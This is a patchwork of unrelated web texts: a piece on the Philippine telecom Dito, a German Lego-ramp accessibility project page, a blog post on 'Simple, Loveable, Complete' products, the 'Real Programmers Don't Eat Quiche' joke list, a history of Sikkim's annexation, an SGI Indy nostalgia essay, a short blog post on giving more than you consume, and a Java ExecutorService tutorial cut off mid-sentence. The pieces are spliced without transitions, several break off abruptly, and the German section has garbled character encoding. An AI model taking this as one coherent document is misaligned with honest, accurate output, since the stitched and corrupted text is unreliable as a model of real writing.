<p>The company fits neatly into two patterns typical of Duterte’s time in office. Giving Dito access to the Philippines internet market enriches a figure who is outside of the traditional oligarchy but is also aligned with the president. And Dito relies heavily on Chinese investment: The company is a partnership with the state-owned China Telecommunications Corporation. Duterte has <a href="https://www.scmp.com/week-asia/politics/article/3034666/china-promised-duterte-us9-billion-infrastructure-hes-had-only">previously courted</a> Beijing for investment in a number of other infrastructure projects.&nbsp;</p>



<p>That money and political support could give Dito a leg up as it tries to contend with two enormous companies with decades of experience and infrastructure. But it will still need to overcome the same challenges that killed off previous competitors that tried challenging the existing duopoly. Even if it fails, however, it may have already served its political purpose. “For the Duterte government, the entry of Dito is really about the <em>perception</em> that they’ve tried to do something about the really bad internet,” says Yusingco.</p>

<p>Hallo .. Hello .. Buongiorno .. Â¡Hola! .. Merhaba .. Bon jour .. OlÃ¡</p>



<h2>Legorampen fÃ¼r WÃ¼rzburg</h2>



<p>Auf dieser Seite findest du alle Informationen zu unserem Projekt <strong>â€žLegorampen fÃ¼r WÃ¼rzburgâ€œ</strong>. Im Newsbereich erscheinen regelmÃ¤ÃŸig neue Artikel, die den Fortgang des Projektes dokumentieren und illustrieren.</p>



<p>Wir stehen noch ganz am Anfang des Projektes. Damit du aber schon siehst, worum es genau geht, gibt es hier ein paar schÃ¶ne Legorampen-Bilder von schon gebauten und installierten Rampen aus Hanau.</p>







<p>Mit freundlicher Erlaubnis der Legooma Rita Ebel, Hanau</p>







<div data-initially-open="false" data-click-to-close="true" data-auto-close="true" data-scroll="false" data-scroll-offset="0"><h3 id="at-42074" role="button">Legorampen in WÃ¼rzburg – warum?</h3><div id="ac-42074">
<p>FÃ¼r die meisten Menschen in WÃ¼rzburg ist der Ã¶ffentliche Raum uneingeschrÃ¤nkt zugÃ¤nglich. Eine Stufe am Eingang eines Ladens oder eines CafÃ©s wird in der Regel nicht wahrgenommen und stellt kein Hindernis dar.<br>Doch fÃ¼r Menschen, die auf einen Rollstuhl oder Rollator angewiesen sind, ist selbst<strong> eine Stufe eine unÃ¼berwindliche Barriere</strong>. Auch Eltern mit KinderwÃ¤gen dÃ¼rften eine Rampe begrÃ¼ÃŸen.</p>



<h4>Da setzt unser Projekt an:</h4>



<p><strong>Eine Legorampe fÃ¼r eine Stufe = Barrierefreiheit sofort</strong></p>



<p>Da im Innenstadtbereich gerade in der FuÃŸgÃ¤ngerzone keine Gehsteige mehr vorhanden sind, ist in der Regel genug Platz, um Aufmerksamkeit schaffend eine Legorampe an EingÃ¤ngen auszulegen.</p>



<p>Wir mÃ¶chten also aus <strong>gebrauchten Legosteinen Rampen bauen</strong>, um so auch mobilitÃ¤tseingeschrÃ¤nkten Menschen barrierefreien Zugang zu ermÃ¶glichen.</p>



<p>So werden GeschÃ¤ftseingÃ¤nge (LÃ¤den, CafÃ©s, Apotheken, …) fÃ¼r Rollstuhlfahrerinnen zugÃ¤nglich, wir sensibilisieren ganz allgemein fÃ¼r das Thema Barrierefreiheit und die GeschÃ¤fte machen zusÃ¤tzlich optisch auf sich aufmerksam. <strong>Das nennen wir â€žWinÂ³â€œ!</strong></p>



<h4>Legosteine – Spendenaufruf</h4>



<p>â€žIhr Legosteine, die ihr in irgendwelchen Kisten auf DachbÃ¶den oder Kellern euer dunkles und unerfÃ¼lltes Dasein fristet – meldet euch! Wir erwecken euch wieder zu Leben und neuem Sinn!â€œ</p>



<p>Ja, wir wollen unsere Legorampen natÃ¼rlich aus alten, gebrauchten Legosteinen bauen (upcyclen).</p>



<p>Frei nach dem Motto <strong>â€žAus alt mach barrierefrei!â€œ</strong></p>



<p>Meldet euch in unserer EUTB-Teilhabeberatungsstelle unter <a href="http://href=&quot;093150456&quot;/">0931-50456</a> oder per E-Mail an <a href="mailto:legorampen@wuesl.de">legorampen@wuesl.de</a></p>

<p><strong>August 2020</strong>:</p>



<p>Die ersten <strong>Spendenboxen stehen</strong> in der <a rel="noreferrer noopener" href="https://www.facebook.com/kaffeeManufakturWue/" target="_blank">Kaffeemanufaktur</a> gleich neben unserer Beratungsstelle in der SpiegelstraÃŸe und im ViertelcafÃ© in der Zellerau, sowie in der Umweltstation, Nigglweg 3, Zellerau.</p>



<p><strong>Juli 2020: </strong></p>



<p>Die Idee nimmt Form an. Wir sind dabei <strong>Spendenboxen zu bauen</strong>, Kontakte zu knÃ¼pfen und die Projektidee in alle Richtungen zu verbreiten. AuÃŸerdem sammeln wir Legosteine und wollen zÃ¼gig unsere erste <strong>Testrampe bauen</strong>.</p>
</div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div><h3 id="i-hate-the-term-mvp">I hate the term MVP.</h3>
<p>Over the past decade, it’s been overused and misunderstood to the point where something labeled as an MVP is automatically assumed to be pretty shit. Most MVPs are unfortunately too M to be V, and the culture of “ship it while you’re embarrassed by it” tends to lead to products providing users with an embarrassingly bad experience.</p>
<h3 id="the-problem-is-that-your-users-hate-mvps">The problem is that your users hate MVPs.</h3>
<p>Building products is a difficult and time-consuming effort. Figuring out what the problems, finding a potential solution to that problem, and then building that solution all take a decent chunk of time and effort. It’s due to this process that the minimum viable product was born. The motivation for building an MVP is still valid. Build something small and easy to test, launch quickly, and pivot or trash it if it doesn’t perform as desired.</p>
<p>There is another, less selfish way.</p>
<p>I read an <a href="https://blog.asmartbear.com/slc.html">article</a> by Jason Cohen a few years ago which changed the way I think about product development. Instead of building MVPs, we should be building SLCs. Something Simple, Loveable, and Complete.</p>
<h3 id="simple">Simple</h3>
<p>When something is simple, it is easier to modify, build on, and maintain (all of which are very important in the early stages of product development). This is different from something being minimal as something can be minimal but not simple. Conversely, few things are simple without being minimal. One of the pieces of feedback I get regularly for <a href="https://justsketch.me/">JustSketchMe</a> is how simple the interface is, and how easy it is to use. By having a small set of powerful tools we keep the simplicity of interaction while providing the ability to create complex scenes.</p>
<h3 id="loveable">Loveable</h3>
<p>Coming from game development, it has always been a priority of mine to ensure my creations elicit joy. It needs to be loveable. If people aren’t getting that “ooh, this is nice” feeling from your early-stage project, they’re unlikely to stick around. Both <a href="https://bearblog.dev/">Bear Blog</a> and <a href="https://somewordsfor.me/">Some words for me</a> were explicitly built to be loveable. From the copy to the way that the user interacts with them, everything is built with <a href="https://en.wikipedia.org/wiki/Marie_Kondo">Marie Kondo</a> in mind. (There’s even an Easter egg on the Bear Blog home page. Happy hunting!)</p>
<h3 id="complete">Complete</h3>
<p>This is the most important of the three traits. The product needs to be complete.</p>
<p>I don’t mean that your product cannot be worked on and expanded anymore. It means that the product is not reliant on additional features for it to be useful to your users. A good way to test this is to think: “If I don’t expand and improve this product anymore, will people still use it?”.
If we take a look at tech products that are doing fairly well, you’ll notice that most (if not all) of them were built as complete products initially. Twitter is so similar to the initial concept, while Facebook has morphed into something else entirely; but both products were completely useable in their inception.</p>
<p>To use one of my projects as an example again, <a href="https://justsketch.me/">JustSketchMe</a> started out with just 2 characters (male and female) and only one in the scene at a time. This was very useful and had I walked away from the project at that point, it would have still been complete. I have since built out the functionality to add many characters to the scene, along with props and saving to the cloud.</p>
<h3 id="design-by-subtraction">Design by subtraction</h3>
<p>With SLCs (as opposed to MVPs) the trick is to design by subtraction. My favourite example of this is the game <a href="https://en.wikipedia.org/wiki/Ico">Ico</a>. It’s a fetch quest game where you need to escort another character and prevent her from being dragged to the underworld by little beasties. The developers started out by designing combat, weapons, and upgrade systems. Loot systems. Health and damage counters. They then sat down to examine which features actually emphasise the core mechanic, and which ones do not. Long story short, they ended up removing almost all the systems we would traditionally see in a game like this. The character now has a stick that is used to fight off beasties (instead of a complex weapon/upgrade system). The character can’t even take damage. The lose state is if the character you’re escorting is dragged to the underworld.</p>
<p>This culminated in one of the best games of the generation. The developers went on to build the iconic Shadow of the Colossus using the same techniques.</p>
<h3 id="conclusion">Conclusion</h3>
<p>Here are some steps to think about when building your next project:</p>
<ol>
<li>Keep the feature-set small and manageable (as opposed to large and hastily built).</li>
<li>Make the product delightful to interact with.</li>
<li>Stay focused on the core idea of the project.</li>
<li>Have fun with it!</li>
</ol>

Programmers Don't Eat Quiche" have been circulating among

<p>
See <a href="http://en.wikipedia.org/wiki/Real_Men_Don%27t_Eat_Quiche">http://en.wikipedia.org/wiki/Real_Men_Don't_Eat_Quiche</a>
for more of a discussion of the mindset involved.
</p><h2>REAL PROGRAMMERS DON'T EAT QUICHE</h2>
<p>
Real programmers don't eat quiche. They like Twinkies, Coke,
and palate-scorching Szechwan food.
</p><p>
Real programmers don't write application programs.  They program
right down to the base-metal. Application programming is for dullards
who can't do systems programming.
</p><p>
Real programmers don't write specs.  Users should be grateful
for whatever they get; they are lucky to get programs at all.
</p><p>
Real programmers don't comment their code.  If it was hard to
write, it should be even harder to understand and modify.
</p><p>
Real programmers don't document. Documentation is for simpletons
who can't read listing or the object code from the dump.
</p><p>
Real programmers don't draw flowcharts.  Flowcharts are,
after all, the illiterate's form of documentation.  Cavemen drew
flowcharts; look how much good it did them.
</p><p>
Real programmers don't read manuals.  Reliance on a reference
is the hallmark of the novice and the coward.
</p><p>
Real programmers don't write in RPG.  RPG is for the gum-chewing
dimwits who maintain ancient payroll programs.
</p><p>
Real programmers don't write in COBOL.  COBOL is for COmmon
Business Oriented Laymen who can run neither a business nor a
real program.
</p><p>
Real programmers don't write in FORTRAN.  FORTRAN is for wimp
engineers who wear white socks.  They get excited over the finite
state analysis and nuclear reactor simulation.
</p><p>
Real programmers don't write in PL/I.  PL/I is for insecure
anal retentives who can't choose between COBOL and FORTRAN.
</p><p>
Real programmers don't write in BASIC.  Actually, no programmers
program in BASIC after reaching puberty.
</p><p>
Real programmers don't write in APL unless the whole program
can be written on one line.
</p><p>
Real programmers don't write in LISP.  Only sissy programs
contain more parentheses than actual code.
</p><p>
Real programmers don't write in PASCAL, ADA, BLISS, or any of
those other sissy computer science languages. Strong typing is a
crutch for people with weak memories.
</p><p>
Real programmers' programs never work right the first time.
But if you throw them on the machine they can be patched into
working order in a few 30 hour debugging sessions.
</p><p>
Real programmers don't work 9 to 5.  If any real programmers
are around at 9 A.M., it is because they were up all night.
</p><p>
Real programmers don't play tennis or any other sport which
requires a change of clothes.  Mountain climbing is OK, and real
programmers wear climbing boots to work in case a mountain should
spring up in the middle of the machine room.
</p><p>
Real programmers disdain structured programming.  Structured
programming is for compulsive neurotics who were prematurely
toilet trained.  They wear neckties and carefully line up sharp
pencils on an otherwise clear desk.
</p><p>
Real programmers don't like the team programming concept.
Unless, of course, they are the chief programmer.
</p><p>
Real programmers never write memos on paper.  They send
memos via mail.
</p><p>
Real programmers have no use for managers.  Managers are a
necessary evil.  They exist only to deal with personnel bozos,
bean counters, senior planners and other mental midgets.
</p><p>
Real programmers scorn floating point arithmetic. The decimal
point was invented for pansy bedwetters who are unable to think big.
</p><p>
Real programmers don't believe in schedules.  Planners make
schedules.  Managers firm up schedules. Frightened coders strive
to meet schedules. Real programmers ignore schedules.
</p></div><p><span face="Hevetica,Arial,Times" size="4">
Real programmers don't bring brown-bag lunches.  If the
vending machine sells it, they eat it.  If the vending machine
doesn't sell it,  they don't eat it.
Vending machines don't sell quiche.

</span>

The Indian Army claimed to be carrying out a routine exercise, but his guards were not convinced. They pleaded with him to escape to Nepal disguised as a monk. They were thinking, perhaps, of a day in 1959 when a 24-year-old from Tibet, anointed the Dalai Lama of his people, had made the opposite journey, fleeing the Chinese regime in soldier’s disguise. </p><p>The Chogyal rejected the plan, but his worst fears were confirmed. At 12.45pm on 9 April, a platoon of jeeps full of soldiers armed for battle surrounded the palace. A guard in the sentry box was shot dead after he raised his rifle. Inside the palace, the Chogyal called up Gurbachan Singh, the political officer who represented the Indian administration. </p><p>“What the hell are you doing?” he exploded. The line went dead.

At the end of it, the Chogyal was placed under house arrest, bringing about the end of a regime that had ruled Sikkim for 333 years.

What we know about it is largely down to three books that differ in the detail about what transpired and why. </p><p>The first was actively suppressed by the Indian state for nearly three decades. Journalist Sunanda Datta-Ray’s book<em> Smash and Grab: The Annexation of Sikkim</em> was published in 1984, but was kept out of circulation with the aid of a defamation suit filed by the government. It was republished in 2014. The book, engrossing in its detail, paints a picture of the Chogyal—a close friend of Dutta-Ray’s—as a lonely bastion, valiantly resisting an expansionist India. </p><p>The Scottish journalist Andrew Duff was initially drawn to Sikkim by reading his grandfather’s account of a trek from Darjeeling to Pemayangtse Monastery in 1922. Duff’s book, S<em>ikkim: Requiem for a Himalayan Kingdom</em>, is largely based on the letters written home by two Scottish principals of a girls’ school in Gangtok.</p><p>In 2018, GBS Sidhu, a retired officer from India’s intelligence agency, the Research and Analysis Wing (R&amp;AW), published <em>Sikkim: Dawn of Democracy </em>(sub-titled “The Truth Behind The Merger With India”). Finally, it publicly owned up to the role played by the agency in Sikkim’s accession to India.</p><p>“What is the Indian obsession with annexing Sikkim?” asked US Secretary of State Henry Kissinger in bewilderment in a staff meeting in Washington when news of the coup reached the world.<a href="" onclick="return!1"><sup id="dgjjygozta6j">[5]</sup></a> It was a naïve question. The answer is inextricably tied to the tumultuous decade of the 1970s when Indira’s India (or India’s Indira) was consolidating its power within and around its borders in the near neighbourhood. It is also tied to the events of the 1960s, particularly the lingering effects of the 1962 war, which in turn was partly triggered by the Dalai Lama’s escape to India. It stretches further back in history to a century of colonial expansionism under British rule that had left Sikkim vulnerable in the first place.</p><p>Sikkim is a tiny, thumb-shaped state wedged between Nepal, Bhutan and Tibet.&nbsp;For centuries, it was the primary route into the two Buddhist kingdoms. When Tibet was occupied in 1950, the expansion of China was brought “almost up to our gates”, as a deeply-worried Sardar Patel wrote to India’s first prime minister, Jawaharlal Nehru.<a href="" onclick="return!1"><sup id="urero0rsaa1s">[6]</sup></a></p><p>The British had made Sikkim a protectorate in 1861, according it the same status as other princely states on the subcontinent. In 1950, three years after independence, Sikkim became a protectorate of the new republic. The kingdom had autonomy in domestic matters but India was responsible for defence, external affairs and communications. For Nehru, Sikkim’s autonomy was nearly sacred. “If we bring a small country like Sikkim within our fold by using force,” he said, “it would be like killing a fly with a bullet.” </p><p>Twenty-five years later, that was no longer the republic’s position. How the change came about is a story with multiple plots involving India’s greatest spymaster, a defiant king, his ambitious political rival, and two enigmatic foreign women. </p></div></div></div></div></section><section data-v-58180b62=""><div data-v-58180b62=""><div data-v-58180b62=""><div data-v-58180b62=""><p data-v-58180b62=""><header>On Her Majesty’s Secret Service</header></p> <div data-v-58180b62=""><div data-v-58180b62=""><p>

In three years’ time, Kao had delivered the agency’s first significant success, providing critical support for the covert training of the guerrilla army Mukti Bahini in what was then East Pakistan. </p><p>“Can you do something about Sikkim?” she asked him. </p></div></div><p>Relations between the Indian state and the kingdom had reached a stalemate. India wanted to create a treaty of Permanent Association, even dangling the carrot of sponsoring Sikkim’s membership to UN organisations in return. But over the 1960s, the Chogyal had been demanding full independence with increasing vigour.&nbsp; </p><p>In the Chogyal’s backyard, the demand for merger with India had originated from the first leader of the Sikkim State Congress,<a href="" onclick="return!1"><sup id="9fqfsawkh439">[7]</sup></a> Tashi Tshering, who had even gone to Delhi in 1948 to negotiate it. Patel, the man in charge of India’s integration, was keen on bringing Sikkim into the fold. Nehru chose to overrule him and sent Tshering back.<a href="" onclick="return!1"><sup id="hop5ace01e8g">[8]</sup></a></p><p>But Nehru’s India kept more than a watchful eye over Sikkim, much like the British had. “The Sikkimese kingdom became highly dependent on the political officers from the time that the British established direct control of Sikkim,” Saul Mullard, a researcher at  Oxford University and author of a book of Sikkimese history, explained. “Indians took over the role of political officers in Sikkim. They inherited the authority of the British and it weakened the ability of the king to set his own agenda.”</p><p>After Indira Gandhi asked him to “do something” about Sikkim, Kao concocted a plan with PN Banerjee, the joint secretary of the R&amp;AW’s eastern division and a fellow mastermind of the Bangladesh operation. He assured the prime minister that the R&amp;AW could handle Sikkim’s merger.<a href="" onclick="return!1"><sup id="fwxp7sqb0kgy">[9]</sup></a> A three-member special ops team was dispatched to Gangtok.</p><p>One of these men was GBS Sidhu, who maintained a meticulous diary of his time in Gangtok. He wrote his book at the prodding of his former boss, who had always been keen for the story of the R&amp;AW’s role in Sikkim to be made public someday. On his passing in 2002, Kao’s own notes on the operations in Sikkim and Bangladesh were handed over to the Nehru Memorial Museum and Library. These will be made public in 2027, according to his will.</p><p>To preserve its reputation as a country that respected the sovereignty of its smaller neighbours, India was keen to legitimize its takeover of Sikkim. It made common cause with the political movement started by Tashi Tshering. India would maintain that the merger was a natural consequence of the peoples’ desire for a democratic form of government. The denouement that came with the coup took more than two years of meticulous planning on the part of the Indian state. </p><p>Like its neighbours Tibet and Bhutan, Sikkim was a conservative Buddhist theocracy. The ruling elite came from two communities: the Bhutia, who migrated from Tibet in the thirteenth century, and the Lepcha, indigenous to Sikkim. The royal family of Namgyals were Bhutia who’d come from Tibet in the sixteenth century. The demographic dynamic of Sikkim started shifting in the late nineteenth century, when Jean Claude White, the first British political officer of Sikkim, began to bring in labour from Nepal to build roads and cultivate land.</p><p>There was another reason why the British encouraged Nepali immigration—to counteract Tibetan influence in Sikkim. There were close religious, cultural and political ties between the two kingdoms. White’s successors tried to undo the policy, but by the early twentieth century, the native population of Bhutia and Lepcha people was already a minority.</p><p>From the 1940s onwards, this, then, was the defining divide in Sikkim’s politics: the tension between its powerful minority and the landless and disenfranchised Nepalis, who had grown to 75 percent of the population by the 1970s. The Chogyal’s inability to provide political representation for the majority of his subjects became his Achilles heel. The R&amp;AW recognized this and surreptitiously worked to exploit it. </p><p>The Sikkim operation helped Kao cement his legacy and strengthen India’s position in relation to China. “It is a fantastic piece of work, handled in a way that it took place under the cover of democracy in process,” the former R&amp;AW officer Rana Banerji, who’s studied the Sikkim papers in the archives of the R&amp;AW’s Kolkata office, told me in a phone interview. “It showed a lot …</p></div></div></div></div></section></div></div></div>

<p>
When I was a kid, computers were cool.</p><p>

Nowadays? Not so much.</p><p>

I know, I know. Grumpy old gits are a dime a dozen, and their views about the past are often filtered through a golden haze of blissful forgetfulness and nostalgia. This is of course the case for me, too, but I still think the point is valid: computers used to be much cooler - by orders of magnitude - than they are now.</p><p>

The situation can perhaps be explained by an analogy: You've got a rusty old 1994 FIAT Punto and there is a rather pressing need for you to invest in a new vehicle. Of course, you can dream big - maybe you'd like some kind of armoured personnel carrier, perhaps a souped-up, pimped-out Tesla with all the bells and whistles or why not a Ferrari? Realistically, though, you're probably considering something along the lines of a brand new Ford: the kind of sensible family car that would still be an upgrade to the withering piece of junk you're currently driving. And, as soon as you've amassed enough funds, that's probably what you're going to buy. That APC, though... Man, how sweet would it be to drive one of those? Just thundering through morning traffic, fist pumping in the air, shouting crude insults at that guy with the SUV who always cuts in front of you at the intersection down by the grocery store. Not so smug now, eh, Mr. Sports Utility?</p><p>

That's what it used to be like with computers.</p><p>

Don't get me wrong. You can spend nearly infinite amounts of money on a computer if you'd like to - it's always been like that and probably will be for the foreseeable future. This is especially true for supercomputer clusters used in science and the mainframes keeping the banks and stock markets ticking. But when dreaming about computer power, few of us imagine having access to a behemoth like that. The things we do with our machines can only go faster up to a certain point, unless we dabble in computational biology in our spare time. It would be like replacing our feeble FIAT with an aircraft carrier: sure, it's powerful, but it's not very practical for getting to and from work.</p><p>

No, the computer we dream about having on our desk is usually something a little bit faster, a little bit sleeker and just a little bit more expensive than what we can actually afford. If you're a dedicated games player, there's always the next graphics card, that extra gig of RAM, those extra few frames per second you can chase - but that's still the realistic dreaming, it's something within reach; perhaps not quite in line with a sensible Ford, but not as far out there as an APC.</p><p>

And, even if you are currently dreaming of the home computer equivalent of an APC (let's pretend that's a top of the line Mac Pro, just for the sake of argument), getting one won't make much of a difference in day to day use. Sure, the machine might be faster than your current one, but except for the rare few cases when you actually utilize all that power, it won't provide a profoundly different user experience compared to what an iMac will deliver at a fraction of the cost. It's the same OS, the same applications and the same basic architecture. This is true for Windows and Linux machines as well: you can add more RAM and disk and CPU cores, but the machine won't behave in a significantly different way from what you're used to.</p><p>

Now, when I was a kid... computers were cool.</p><p>

In 1994, I bought a second hand Amiga 1200 with a 120 megabyte hard drive. It was a low cost, capable home computer with good sound and graphics. It was more than enough for the kind of gaming and school work a kid my age wanted to do, but the 14 MHz processor was a tad slow when it came to heavy lifting. Applying just a hint of Gaussian blur to a very low resolution JPEG file took ages. Dabbling in animation, I frequently hit the barrier of the 2 megs of RAM it came with. However, it also had a motherboard connector for adding more memory and a faster CPU. This was the reasonable dream: it was within my reach, it was the sensible family Ford.</p><p>

Thus, in 1995, I got a CPU and RAM upgrade for it, making it roughly four times faster. In those days, that was a pretty hefty upgrade: speeding up from 10 to 40 MPH is more noticeable to a human compared to the difference between the 10000 and 40000 MPH speeds of today's machines. But the speed-up didn't profoundly change my user experience. I was still shuffling about with the same old software and I was still waiting around for that Gaussian blur calculation to finish - although not quite as many minutes as before.</p><p>

As I sat there, watching the Gaussian blur progress bar, I of course dreamt of the computing equivalent of an Armoured Personnel Carrier. It wasn't an Amiga 4000 or a Pentium PC or one of those new-fangled PowerMacs. It was something completely different, something that would have utterly changed my all-round user experience, from boot-up to shutdown. I wanted something the likes of which actually no longer exists: I dreamt of a Unix Workstation.</p><p>

Not just any old Unix box mind you, but a rather specific one: a Silicon Graphics Indy with a 24-bit frame buffer, 128 megabytes of memory and a 175 MHz MIPS R4400 CPU.</p><p>

It was, hands down, just about the most maxed-out piece of hardware that could grace the top of a desk. Design-wise, computers have always been kind of beige - literally and figuratively. Black computers became commonplace some time around, say, 2000, but that was hardly a giant leap in design. Depending on your tastes, you might think companies like Apple or Alienware produce attractive machines - but then again, perhaps you've never seen an SGI Indy.</p><p>

The teal blue pizza box case sports a horizontal, slightly diagonally skewed cut along the middle, shifting the top and bottom parts in a slight offset. The monitor was huge for its time: a 17" CRT cased in grey granite plastic, matching the mouse and keyboard. Both the computer and the screen were adorned with embossed SGI cube logos in a gleaming silver finish. It was over the top, maximalist 1990s more-is-more design in a strangely tasteful package and a far cry from the sleek, subdued designer machines of today. Yet, it wasn't an overstatement - it might've talked the talk, but it sure as hell could walk the walk.</p><p>

For example, it didn't even have a regular floppy drive - it had a bizarre floptical unit capable of storing 20 megabytes on a single, magneto-optical disk. On top of the giant screen a webcam was poised, surely one of the absolutely first computers to come with such a device as standard. In fact, it was called an IndyCam - the term webcam hadn't really caught on yet and was more commonly used to describe just about any camera that regularly uploaded a still image to a public web server.</p><p>

And that, of course, are all trivial oddities compared to the guts of the machine. Even though it was an entry-level workstation, SGI's custom hardware was capable of churning out both 2D and 3D graphics unmatched by any contemporaneous gaming PC, however expensive, and the CPU could run in circles around even the most outrageously-priced Pentium home computer available at the time.</p><p>

And then there was the operating system. And the software.</p><p>

IRIX, SGI's in-house Unix flavour, came with their own proprietary GUI and desktop. It was called Indigo Magic and, featuring things like scalable vector icons, animated desktop backgrounds and visual feedback cues, it was just about as outlandish as the name suggests. It should be noted that this was ten years before any PC owner had gotten the chance to grow tired of such pointless flash and that for the serious hacker, there was always a terminal emulator with a capable shell on hand.</p><p>

Apart from all the usual Unix-related niceties such as stability, pre-emptive multitasking, multi-user support, excellent command line utilities and a bunch of readily available programming languages, it had an impressive array of professional productivity software. Most of it was not available on my home computer, and even if it was, the Indy could run it both faster and in higher resolution. Apart from industry standards such as Photoshop and Netscape, there was a world of curious and wonderful applications written with nothing but SGI hardware in mind: web authoring, video editing, image manipulation and graphics creation unavailable on any other platform. It was a true digital media production workhorse, an overgrown distant cousin to the machines available on the then budding multimedia PC market.</p><p>

In short, it was a cool computer. Far too expensive for any home user, of course. But so. Damn. Cool.</p><p>

There are computers aimed at this kind of work today as well. One of the high-end Macs mentioned before, for example, or perhaps a suitably high-powered Windows machine. In fact, pretty much any dirt cheap home computer will, pixel for pixel, do what the Indy did - except faster, cheaper and in many cases better.</p><p>

Yet there isn't, today, an equivalent of the SGI Indy, or the Sun SPARCstation, or the DEC Alpha, or any of the other professional workstations. The only thing that's on offer is more of the same user experience, only slightly faster.</p><p>

That's why computers are so boring these days. Because even though IRIX, Indigo Magic and the Indy by no means was a perfect solution to all of my computational desires back then, it had the lure of the unknown and unattainable: it was a goal to strive for, a source of inspiration and aspiration and a promise that better things were possible.</p><p>

Today, we all know about the different quirks, mannerisms, privacy issues, drawbacks and occasional benefits of Windows update loops, overpriced Mac hardware and the tiresome fiddliness of Linux. Those are the choices we have and they're not going to change any time soon.</p><p>

I'd somehow be more okay with all of this if it wasn't for the fact that, to top it all off, we have no other platform left to dream of.</p><p>

That's just not cool.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody"><p>As a general rule in life, you should provide more value to society than you consume. This should be, at the very least, your goal. Let me elaborate.</p><p>If, for example, you are a writer / blogger and are making a cold outreach to your fellow blogger for a guest post or a mention, you are consuming. Well, in that scenario, you should never ask for something in the first communication with that person. You should at least start with an introduction or letting them know what you did for them (mentioned them in your post, for example). I hear this recommendation from <a href="https://www.nateliason.com/" target="_blank" rel="nofollow noopener noreferrer">Nat Eliason</a> first from his post “<a href="https://sumo.com/stories/0-10k-nat-eliason/" target="_blank" rel="nofollow noopener noreferrer">How Nat Eliason Grew A Website To 10K Visitors In A Month</a>”.</p><p>The goal here is to introduce yourself and potentially make friends. If you are a good person and stick to this workflow, you will eventually achieve your goal, more often than not. If you are not a good person and are simply using the intro message as an excuse to ask for something, then at some point, there will be a negative view of your ways, and this won’t work for you.</p><p>Another great example is for business owners. I have had many interactions with Customer Service. Whenever I had a good experience, I have then “marked” the company as “Great” in my head. This made it more likely for me to do business with them in the future and recommending someone else does too. This is because that company didn’t want to take anything from me (more money, for example). Rather, they were looking to provide me with help and relief. For that reason, I was more likely to buy more and recommend my friends more, also. This is what the goal of the business, get more sales. This “Be awesome to your customers and good things follow.” thought comes from the book <a href="https://amzn.to/2TQFowG" target="_blank" rel="nofollow noopener noreferrer">Traction</a> by <a href="https://ye.gg/" target="_blank" rel="nofollow noopener noreferrer">Gabriel Weinberg</a>.</p><p>You can get the things you want, as a person, or business, while staying nice. The mindset one needs to keep is to produce more than consume.</p><p>If you have any feedback, please let me know on <a href="https://twitter.com/rasulkireev/status/1323583172316221441" target="_blank" rel="nofollow noopener noreferrer">Twitter</a>.

                <p>In the previous post, I was writing about the <a href="https://turkogluc.com/java-concurrency-basics-of-threads/">Basics of Threads</a>. This post is going to focus on a higher-level abstraction of thread creation and management.</p><p>Concurrent programs generally run a large number of tasks. Creating thread on demand for each task is not a good approach in terms of performance and usage of the resource as the thread creation and threads itself is very expensive. There is also a limitation for the maximum number of threads a program can create, couple of thousands depending on your machine (this is going to be changed with Project Loom).</p><p>A call center is one of the good example given to illustrate parallelisation; you can have bounded number of customer representatives in the call center and if there will be more customer calling than your employees, customers wait in the queue until one representative will be available to take the next call. So, hiring a new representative on each call would not make sense.</p><p>Therefore it is a better idea to have a thread pool containing a number of threads that would execute the tasks we are sending. Thread pool may create the threads statically (at the time of the creation of the pool), or dynamically (on demand), but it should have a reasonable upper bound. If you like to see a simple thread pool implementation that is queuing the submitted tasks and using the threads from the pool to execute them please check the example in the <a href="https://turkogluc.com/java-concurrency-basics-of-threads/">previous post</a>. </p><p>Using the low-level Thread API is also hard and it requires very much attention each time we need to use it. Java Executor framework helps us in this manner by decoupling the creation and management of the Threads from the rest of the application.</p><p>In the following sections, I will try to explain consecutively, the <code>ExecutorService</code> interface and its methods, implementations of the <code>ExecutorService</code>, and using the factory methods of <code>Executors</code> to simplify creation of <code>ExecutorService</code>.</p><h2 id="the-executor-service">The Executor Service</h2><p>At the heart of the executor framework, there is the <code>Executor</code> interface which has the single <code>execute</code> method:</p><figure><img src="https://turkogluc.com/content/images/2020/11/Screenshot-2020-11-01-at-22.10.39.png"></figure><p><code>ExecutorService</code> is the main interface extending the <code>Executor</code> and we are going to mostly interact with. It is an abstraction around a Thread Pool, and exposes the <code>submit</code> method that we use to send the tasks. It contains a number of threads in its pool depending its implementations which we will see in the following sections.</p><p>When we send the <code>Runnable</code> or <code>Callable</code> tasks by <code>submit</code> method, the threads from the pool are going to run them.</p><ul><li><strong>Runnable</strong>: So far we have mentioned only about runnable, which does not return anything or is not able to throw any exception.</li><li><strong>Callable</strong>: As similar to the Runnable, designed for classes whose<br>instances are potentially executed by another thread<em>,</em> &nbsp;but <em>returns a result</em> and <em>may throw exception</em>.</li></ul><figure><img src="https://turkogluc.com/content/images/2020/11/Screenshot-2020-11-01-at-23.28.44.png"><figcaption>Runnable vs Callable</figcaption></figure><p>Submit method returns a <code>Future</code> object that represents the result of an asynchronous computation. &nbsp;Future has methods to check if the task is complete, to wait for its completion, and to retrieve the result. Its <code>get</code> method returns the result but it is a <strong>blocking method</strong>, so we can postpone calling the get method as long as possible and do other operations. Once we need the result of the task, we call the get method and if the result is not ready the calling thread will be blocked and we need to wait the result. If we can not afford waiting for long time, we can call the method with a <strong>timeout</strong>.</p><figure><img src="https://turkogluc.com/content/images/2020/11/Screenshot-2020-11-01-at-22.55.06.png"><figcaption>Future interface</figcaption></figure><p>The <code>ExecutorService</code> also provides methods for sending collection of tasks all together. We can use <code>invokeAll</code> method to send multiple tasks, and it returns List of Futures. <code>InvokeAny</code> method can be used to run similar tasks, and it returns the fastest answer</p><p>Another important advantage executor service provides is that it has shutdown functionality to stop the pool and the threads. There is an important difference between <code>shutdown</code> and <code>shutdownNow</code> methods:</p><ul><li><strong>shutdown</strong>: Calling this method indicates that no new tasks will be accepted to the queue, and previously sent tasks are going to be waited to complete. Note that if the tasks are long running tasks (infinite loop) they will never complete.</li><li><strong>shutdownNow</strong>: This method interrupts all the active threads, stops the processing of new tasks from the queue and returns the list of those tasks that were waiting in the queue. </li></ul><p>Note that in order to stop the processing, we need to <em>handle the interruption</em> in our <code>Runnable/Callable</code> tasks. Otherwise <code>shutdownNow</code> will trigger interruption but no thread will show reaction to it, and it behaves same as <code>shutdown</code>.</p><p>We can also see the 